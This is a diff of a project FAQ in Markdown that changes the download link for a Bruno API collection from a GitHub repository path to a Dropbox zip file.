@@ -98,7 +98,7 @@ order: 4
 
 ## 7. Do you have an API collection to easily explore the features?
 
-<sup>Yes, I provide a [Bruno](https://github.com/rodrigogalura/tuner/tree/main/stubs/bruno-collection) collection to help you explore and test the features out of the box.</sup>
+<sup>Yes, I provide a [Bruno](https://www.dropbox.com/scl/fi/avcw3laq7aad3kxagovys/bruno-collection.zip?rlkey=jqv8d0qs5ksa8w8idqvjwk2ck&st=klccgsnz&dl=0) collection to help you explore and test the features out of the box.</sup>
 
 > <sup>If you’re using a different API client like *Postman* or *Insomnia*, you can easily convert the Bruno collection using available tools or export options.</sup>
 
